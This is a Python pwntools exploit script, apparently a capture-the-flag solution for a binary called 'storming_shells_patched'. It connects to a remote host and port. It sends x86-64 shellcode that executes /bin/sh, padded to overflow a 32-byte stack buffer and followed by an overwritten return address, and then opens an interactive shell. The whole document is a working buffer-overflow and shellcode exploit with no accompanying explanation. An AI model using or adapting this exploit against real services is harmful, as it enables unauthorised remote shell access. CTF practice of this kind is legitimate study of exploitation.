from pwn import *

elf = ELF("./storming_shells_patched")

context.binary = elf

# p = process(stdout=PIPE)
# gdb.attach(p)
p = remote("34.124.170.181", 17665)

payload = asm("""
    xor rsi, rsi
    movabs rbx, 0x68732f6e69622f
    push rbx
    xor rdx, rdx
    mov rdi, rsp
    mov rax, 0x3b
    syscall
""")

payload += b'a' * (32 - len(payload) + 8) + pack(0x00000000004010ec)
p.sendline(payload)

p.interactive()
